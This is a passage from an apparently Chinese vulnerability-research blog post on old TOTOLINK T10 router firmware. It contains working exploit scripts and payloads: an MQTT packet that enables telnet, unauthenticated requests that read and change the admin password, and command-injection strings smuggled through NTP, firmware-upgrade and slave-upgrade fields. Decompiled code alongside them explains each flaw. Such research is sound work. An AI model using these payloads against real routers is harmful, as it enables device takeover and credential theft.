src=\"/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230514144610603.png\" alt=\"image-20230514144610603\"></p>\n<p>​\t\t基于上面分析,可以利用pwntools直接构造mqtt的数据包</p>\n<h3 id=\"5-1-3-利用pwntools构造mqtt的数据包\"><a href=\"#5-1-3-利用pwntools构造mqtt的数据包\" class=\"headerlink\" title=\"5.1.3 利用pwntools构造mqtt的数据包\"></a>5.1.3 利用pwntools构造mqtt的数据包</h3><p>​\t\t这条消息中的下面选中部分就是发送的设置telnet的mqtt publish报文,也就是脚本中的msg2</p>\n<p>31\t1.735248\t127.0.0.1\t127.0.0.1\tMQTT\t175\tPublish Message [totolink&#x2F;router&#x2F;setting&#x2F;setTelnetCfg]</p>\n<p><img src=\"/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230514145035879.png\" alt=\"image-20230514145035879\"></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">io = remote(<span class=\"string\">&quot;192.168.55.1&quot;</span>,<span class=\"number\">1883</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">msg1 = <span class=\"string\">&quot;\\x10\\x1a\\x00\\x04\\x4d\\x51\\x54\\x54\\x04\\x02\\x00\\x3c\\x00\\x0e\\x4d\\x51\\x54\\x54\\x5f\\x46\\x58\\x5f\\x43\\x6c\\x69\\x65\\x6e\\x74&quot;</span></span><br><span class=\"line\">msg2 = <span class=\"string\">&quot;\\x30\\x65\\x00\\x24\\x74\\x6f\\x74\\x6f\\x6c\\x69\\x6e\\x6b\\x2f\\x72\\x6f\\x75\\x74\\x65\\x72\\x2f\\x73\\x65\\x74\\x74\\x69\\x6e\\x67\\x2f\\x73\\x65\\x74\\x54\\x65\\x6c\\x6e\\x65\\x74\\x43\\x66\\x67\\x7b\\x0a\\x09\\x22\\x74\\x6f\\x70\\x69\\x63\\x75\\x72\\x6c\\x22\\x3a\\x09\\x22\\x73\\x65\\x74\\x74\\x69\\x6e\\x67\\x2f\\x73\\x65\\x74\\x54\\x65\\x6c\\x6e\\x65\\x74\\x43\\x66\\x67\\x22\\x2c\\x0a\\x09\\x22\\x74\\x65\\x6c\\x6e\\x65\\x74\\x5f\\x65\\x6e\\x61\\x62\\x6c\\x65\\x64\\x22\\x3a\\x09\\x22\\x31\\x22\\x0a\\x7d&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">io.send(msg1)       <span class=\"comment\"># connect</span></span><br><span class=\"line\">sleep(<span class=\"number\">0.2</span>)</span><br><span class=\"line\">io.send(msg2)       <span class=\"comment\"># setTelnetCfg 1</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"5-1-4-mqtt-fx使用\"><a href=\"#5-1-4-mqtt-fx使用\" class=\"headerlink\" title=\"5.1.4 mqtt.fx使用\"></a>5.1.4 mqtt.fx使用</h3><p><a href=\"https://blog.csdn.net/weixin_43940932/article/details/107935303\">https://blog.csdn.net/weixin_43940932/article/details/107935303</a></p>\n<p>​\t\t这是一个调试mqtt协议的工具, 先修改mqtt代理的ip,就是路由器的ip,</p>\n<p><img src=\"/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230509152828308.png\" alt=\"image-20230509152828308\"></p>\n<p>​\t\tsubscribe订阅 #是订阅全部</p>\n<p><img src=\"/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230509153103381.png\" alt=\"image-20230509153103381\"></p>\n<p>publish,发送报文</p>\n<p><img src=\"/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230509153124891.png\" alt=\"image-20230509153124891\"></p>\n<h1 id=\"六、so库命令执行漏洞挖掘\"><a href=\"#六、so库命令执行漏洞挖掘\" class=\"headerlink\" title=\"六、so库命令执行漏洞挖掘\"></a>六、so库命令执行漏洞挖掘</h1><p>​\t\t有命令执行的一般都要有system,execve 或者包装好的函数 CsteSystem,如果有交叉引用的漏洞函数,那么也可能存在命令执行</p>\n<p>一共9个文件.  后面有时间感觉可以写个ida脚本自动化来找…</p>\n<h2 id=\"6-1-system-so\"><a href=\"#6-1-system-so\" class=\"headerlink\" title=\"6.1 system.so\"></a>6.1 system.so</h2><p>主要包含下面的函数</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">module_init</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  cste_hook_register(<span class=\"string\">&quot;getPasswordCfg&quot;</span>, getPasswordCfg);</span><br><span class=\"line\">  cste_hook_register(<span class=\"string\">&quot;setPasswordCfg&quot;</span>, setPasswordCfg);</span><br><span class=\"line\">  cste_hook_register(<span class=\"string\">&quot;NTPSyncWithHost&quot;</span>, NTPSyncWithHost);</span><br><span class=\"line\">  cste_hook_register(<span class=\"string\">&quot;getNTPCfg&quot;</span>, getNTPCfg);</span><br><span class=\"line\">  cste_hook_register(<span class=\"string\">&quot;setNTPCfg&quot;</span>, setNTPCfg);</span><br><span class=\"line\">  cste_hook_register(<span class=\"string\">&quot;getDDNSStatus&quot;</span>, getDDNSStatus);</span><br><span class=\"line\">  cste_hook_register(<span class=\"string\">&quot;getDDNSCfg&quot;</span>, getDDNSCfg);</span><br><span class=\"line\">  cste_hook_register(<span class=\"string\">&quot;setDDNSCfg&quot;</span>, setDDNSCfg);</span><br><span class=\"line\">  cste_hook_register(<span class=\"string\">&quot;getSyslogCfg&quot;</span>, getSyslogCfg);</span><br><span class=\"line\">  cste_hook_register(<span class=\"string\">&quot;clearSyslog&quot;</span>, clearSyslog);</span><br><span class=\"line\">  cste_hook_register(<span class=\"string\">&quot;setSyslogCfg&quot;</span>, setSyslogCfg);</span><br><span class=\"line\">  cste_hook_register(<span class=\"string\">&quot;getMiniUPnPConfig&quot;</span>, getMiniUPnPConfig);</span><br><span class=\"line\">  cste_hook_register(<span class=\"string\">&quot;setMiniUPnPConfig&quot;</span>, setMiniUPnPConfig);</span><br><span class=\"line\">  cste_hook_register(<span class=\"string\">&quot;LoadDefSettings&quot;</span>, LoadDefSettings);</span><br><span class=\"line\">  cste_hook_register(<span class=\"string\">&quot;RebootSystem&quot;</span>, RebootSystem);</span><br><span class=\"line\">  cste_hook_register(<span class=\"string\">&quot;FirmwareUpgrade&quot;</span>, FirmwareUpgrade);</span><br><span class=\"line\">  cste_hook_register(<span class=\"string\">&quot;getRebootScheCfg&quot;</span>, getRebootScheCfg);</span><br><span class=\"line\">  cste_hook_register(<span class=\"string\">&quot;setRebootScheCfg&quot;</span>, setRebootScheCfg);</span><br><span class=\"line\">  cste_hook_register(<span class=\"string\">&quot;getTelnetCfg&quot;</span>, getTelnetCfg);</span><br><span class=\"line\">  cste_hook_register(<span class=\"string\">&quot;setTelnetCfg&quot;</span>, setTelnetCfg);</span><br><span class=\"line\">  cste_hook_register(<span class=\"string\">&quot;SystemSettings&quot;</span>, SystemSettings);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"6-1-1-getPasswordCfg-未授权获取用户名密码\"><a href=\"#6-1-1-getPasswordCfg-未授权获取用户名密码\" class=\"headerlink\" title=\"6.1.1 getPasswordCfg 未授权获取用户名密码\"></a>6.1.1 getPasswordCfg 未授权获取用户名密码</h3><h4 id=\"mqtt-1883端口攻击\"><a href=\"#mqtt-1883端口攻击\" class=\"headerlink\" title=\"mqtt 1883端口攻击\"></a>mqtt 1883端口攻击</h4><p>totolink&#x2F;router&#x2F;setting&#x2F;getPasswordCfg</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"string\">&quot;topicurl&quot;</span>:<span class=\"string\">&quot;setting/getPasswordCfg&quot;</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>会直接返回用户名密码</p>\n<p><img src=\"/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230509154711114.png\" alt=\"image-20230509154711114\"></p>\n<h4 id=\"80端口攻击\"><a href=\"#80端口攻击\" class=\"headerlink\" title=\"80端口攻击\"></a>80端口攻击</h4><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"></span><br><span class=\"line\">response = requests.post(<span class=\"string\">&quot;http://192.168.55.1/cgi-bin/cstecgi.cgi&quot;</span>,data=<span class=\"string\">&#x27;&#123;&quot;topicurl&quot;:&quot;setting/getPasswordCfg&quot;&#125;&#x27;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(response.text)</span><br></pre></td></tr></table></figure>\n\n<p>效果</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(base) ➜  router python3 password.<span class=\"built_in\">exp</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"string\">&quot;admuser&quot;</span>:\t<span class=\"string\">&quot;admin&quot;</span>,</span><br><span class=\"line\">\t<span class=\"string\">&quot;admpass&quot;</span>:\t<span class=\"string\">&quot;123456888&quot;</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<p>GetLanguageCfg也可以,不过不在system.so这里</p>\n<h3 id=\"6-1-2-setPasswordCfg-未授权修改密码\"><a href=\"#6-1-2-setPasswordCfg-未授权修改密码\" class=\"headerlink\" title=\"6.1.2 setPasswordCfg 未授权修改密码\"></a>6.1.2 setPasswordCfg 未授权修改密码</h3><p>totolink&#x2F;router&#x2F;setting&#x2F;setPasswordCfg</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"string\">&quot;topicurl&quot;</span>:<span class=\"string\">&quot;setting/setPasswordCfg&quot;</span>,</span><br><span class=\"line\">\t<span class=\"string\">&quot;admuser&quot;</span>:<span class=\"string\">&quot;admin&quot;</span>,</span><br><span class=\"line\">\t<span class=\"string\">&quot;admpass&quot;</span>:<span class=\"string\">&quot;123456888&quot;</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"6-1-3-NTPSyncWithHost-命令执行\"><a href=\"#6-1-3-NTPSyncWithHost-命令执行\" class=\"headerlink\" title=\"6.1.3 NTPSyncWithHost 命令执行\"></a>6.1.3 NTPSyncWithHost 命令执行</h3><h4 id=\"mqtt-1883端口\"><a href=\"#mqtt-1883端口\" class=\"headerlink\" title=\"mqtt 1883端口\"></a>mqtt 1883端口</h4><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">totolink/router/setting/NTPSyncWithHost</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"string\">&quot;topicurl&quot;</span>:<span class=\"string\">&quot;setting/NTPSyncWithHost&quot;</span>,</span><br><span class=\"line\">\t<span class=\"string\">&quot;hostTime&quot;</span>:<span class=\"string\">&quot;;&#x27;$(/tmp/busybox-mipsel$&#123;IFS&#125;touch$&#123;IFS&#125;/tmp/test123)&#x27;;&quot;</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"80端口\"><a href=\"#80端口\" class=\"headerlink\" title=\"80端口\"></a>80端口</h4><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"></span><br><span class=\"line\">response = requests.post(<span class=\"string\">&quot;http://192.168.55.1/cgi-bin/cstecgi.cgi&quot;</span>,data=<span class=\"string\">&#x27;&#123;&quot;topicurl&quot;:&quot;setting/NTPSyncWithHost&quot;,&quot;hostTime&quot;:&quot;;\\&#x27;$(/tmp/busybox-mipsel$&#123;IFS&#125;touch$&#123;IFS&#125;/tmp/test123)\\&#x27;;&quot;&#125;&#x27;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(response.text)</span><br></pre></td></tr></table></figure>\n\n\n\n<p>主要漏洞原因是获取了hostTime参数后,直接拼接起来然后传给了CsteSystem进行命令执行了</p>\n<p><img src=\"/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230510111118962.png\" alt=\"image-20230510111118962\"></p>\n<h3 id=\"6-1-4-setNTPCfg-命令执行\"><a href=\"#6-1-4-setNTPCfg-命令执行\" class=\"headerlink\" title=\"6.1.4 setNTPCfg 命令执行\"></a>6.1.4 setNTPCfg 命令执行</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">totolink/router/setting/setNTPCfg</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"string\">&quot;topicurl&quot;</span>:<span class=\"string\">&quot;setting/setNTPCfg&quot;</span>,</span><br><span class=\"line\">\t<span class=\"string\">&quot;tz&quot;</span>:<span class=\"string\">&quot;UTC+0&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;ntpServerIp&quot;</span>:<span class=\"string\">&quot;;&#x27;$(/tmp/busybox-mipsel$&#123;IFS&#125;touch$&#123;IFS&#125;/tmp/test123456)&#x27;;&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;ntpClientEnabled&quot;</span>:<span class=\"string\">&quot;ON&quot;</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230510112944980.png\" alt=\"image-20230510112944980\"></p>\n<p>apmib_set在哪呢?</p>\n<p>搜索一下 grep -rin apmib_set</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(base) ➜  squashfs-root grep -rin apmib_set</span><br><span class=\"line\">Binary file ./bin/csteSys matches</span><br><span class=\"line\">Binary file ./bin/AC matches</span><br><span class=\"line\">Binary file ./bin/cs_statistics matches</span><br><span class=\"line\">Binary file ./bin/WTP matches</span><br><span class=\"line\">Binary file ./bin/flash matches</span><br><span class=\"line\">Binary file ./bin/sysconf matches</span><br><span class=\"line\">Binary file ./bin/ntp_inet matches</span><br><span class=\"line\">Binary file ./bin/fwupg matches</span><br><span class=\"line\">Binary file ./bin/AACWTP matches</span><br><span class=\"line\">Binary file ./lib/cste_modules/wan.so matches</span><br><span class=\"line\">Binary file ./lib/cste_modules/wps.so matches</span><br><span class=\"line\">Binary file ./lib/cste_modules/system.so matches</span><br><span class=\"line\">Binary file ./lib/cste_modules/firewall.so matches</span><br><span class=\"line\">Binary file ./lib/cste_modules/wireless.so matches</span><br><span class=\"line\">Binary file ./lib/cste_modules/global.so matches</span><br><span class=\"line\">Binary file ./lib/cste_modules/lan.so matches</span><br><span class=\"line\">Binary file ./lib/libapmib.so matches</span><br><span class=\"line\">Binary file ./lib/libcstelib.so matches</span><br></pre></td></tr></table></figure>\n\n<p>​\t\tBinary file .&#x2F;lib&#x2F;libapmib.so matches 这个名字看着就像,但是这个一个第三方库,就是设置值的,不像是触发漏洞的点</p>\n<p>​\t\t后来进行gdb动态调试的时候发现,system触发点在set_timeZone()函数中,也很奇怪,因为这个函数并没有传入的值. </p>\n<h2 id=\"6-2-upgrade-so\"><a href=\"#6-2-upgrade-so\" class=\"headerlink\" title=\"6.2 upgrade.so\"></a>6.2 upgrade.so</h2><p>主要函数</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">module_init</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  cste_save_fwinfo();</span><br><span class=\"line\">  cste_hook_register(<span class=\"string\">&quot;setUpgradeFW&quot;</span>, &amp;setUpgradeFW);</span><br><span class=\"line\">  cste_hook_register(<span class=\"string\">&quot;setUploadSetting&quot;</span>, &amp;setUploadSetting);</span><br><span class=\"line\">  cste_hook_register(<span class=\"string\">&quot;CloudACMunualUpdate&quot;</span>, CloudACMunualUpdate);</span><br><span class=\"line\">  cste_hook_register(<span class=\"string\">&quot;slaveUpgrade&quot;</span>, slaveUpgrade);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> __fastcall <span class=\"title function_\">dl</span><span class=\"params\">(<span class=\"type\">const</span> <span class=\"type\">char</span> *a1)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">char</span> v3[<span class=\"number\">512</span>]; <span class=\"comment\">// [sp+18h] [-300h] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">char</span> v4[<span class=\"number\">256</span>]; <span class=\"comment\">// [sp+218h] [-100h] BYREF</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">memset</span>(v3, <span class=\"number\">0</span>, <span class=\"keyword\">sizeof</span>(v3));</span><br><span class=\"line\">  <span class=\"built_in\">memset</span>(v4, <span class=\"number\">0</span>, <span class=\"keyword\">sizeof</span>(v4));</span><br><span class=\"line\">  getStrFromTmp(<span class=\"string\">&quot;DlFileUrl&quot;</span>, v4);</span><br><span class=\"line\">  <span class=\"built_in\">sprintf</span>(v3, <span class=\"string\">&quot;wget -O %s  %s&quot;</span>, a1, v4);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> CsteSystem(v3, <span class=\"number\">0</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>getStrFromTmp这个是干什么的..</p>\n<h4 id=\"6-2-1-setUpgradeFW-命令执行\"><a href=\"#6-2-1-setUpgradeFW-命令执行\" class=\"headerlink\" title=\"6.2.1 setUpgradeFW 命令执行\"></a>6.2.1 setUpgradeFW 命令执行</h4><p>​\t\t注意这里拼接命令和其他有所不同</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">totolink/router/setting/setUpgradeFW</span><br><span class=\"line\">    </span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"string\">&quot;topicurl&quot;</span>:<span class=\"string\">&quot;setting/setUpgradeFW&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;Flags&quot;</span>:<span class=\"number\">1</span>,</span><br><span class=\"line\">\t<span class=\"string\">&quot;FileName&quot;</span>:<span class=\"string\">&quot;;/tmp/busybox-mipsel$&#123;IFS&#125;touch$&#123;IFS&#125;/tmp/setUpgradeFW;&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;ContentLength&quot;</span>:<span class=\"number\">12</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t当ContentLength小于0x100000时,执行LABEL_14的逻辑,这里是出现错误删除文件的功能,进行了拼接</p>\n<p><img src=\"/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230514110249946.png\" alt=\"image-20230514110249946\"></p>\n<p><img src=\"/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230514110102231.png\" alt=\"image-20230514110102231\"></p>\n<h4 id=\"6-2-2-setUploadSetting-命令执行\"><a href=\"#6-2-2-setUploadSetting-命令执行\" class=\"headerlink\" title=\"6.2.2 setUploadSetting 命令执行\"></a>6.2.2 setUploadSetting 命令执行</h4><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">totolink/router/setting/setUploadSetting</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"string\">&quot;topicurl&quot;</span>:<span class=\"string\">&quot;setting/setUploadSetting&quot;</span>,</span><br><span class=\"line\">\t<span class=\"string\">&quot;FileName&quot;</span>:<span class=\"string\">&quot;;/tmp/busybox-mipsel$&#123;IFS&#125;touch$&#123;IFS&#125;/tmp/setUploadSetting;&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;ContentLength&quot;</span>:<span class=\"string\">&quot;;/tmp/busybox-mipsel$&#123;IFS&#125;touch$&#123;IFS&#125;/tmp/setUploadSetting;&quot;</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p><img src=\"/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230514111626192.png\" alt=\"image-20230514111626192\"></p>\n<p>获取的文件名会进行读取</p>\n<p><img src=\"/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230514111658292.png\" alt=\"image-20230514111658292\"></p>\n<h4 id=\"6-2-3-slaveUpgrade-命令执行\"><a href=\"#6-2-3-slaveUpgrade-命令执行\" class=\"headerlink\" title=\"6.2.3 slaveUpgrade 命令执行\"></a>6.2.3 slaveUpgrade 命令执行</h4><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">totolink/router/setting/slaveUpgrade</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"string\">&quot;topicurl&quot;</span>:<span class=\"string\">&quot;setting/slaveUpgrade&quot;</span>,</span><br><span class=\"line\">\t<span class=\"string\">&quot;url&quot;</span>:<span class=\"string\">&quot;;&#x27;$(/tmp/busybox-mipsel$&#123;IFS&#125;touch$&#123;IFS&#125;/tmp/test123)&#x27;;&quot;</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230514104331376.png\" alt=\"image-20230514104331376\"></p>\n<p><img src=\"/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230514104424860.png\" alt=\"image-20230514104424860\"></p>\n<h2 id=\"6-3-global-so\"><a href=\"#6-3-global-so\" class=\"headerlink\" title=\"6.3 global.so\"></a>6.3 global.so</h2><p>​\t\t主要功能</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">module_init</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  cste_hook_register(<span class=\"string\">&quot;getOpMode&quot;</span>, getOpMode);</span><br><span class=\"line\">  cste_hook_register(<span class=\"string\">&quot;setOpMode&quot;</span>, setOpMode);</span><br><span class=\"line\">  cste_hook_register(<span class=\"string\">&quot;getGlobalFeatureBuilt&quot;</span>, getGlobalFeatureBuilt);</span><br><span class=\"line\">  cste_hook_register(<span class=\"string\">&quot;getSysStatusCfg&quot;</span>, getSysStatusCfg);</span><br><span class=\"line\">  cste_hook_register(<span class=\"string\">&quot;getLanguageCfg&quot;</span>, getLanguageCfg);</span><br><span class=\"line\">  cste_hook_register(<span class=\"string\">&quot;setLanguageCfg&quot;</span>, 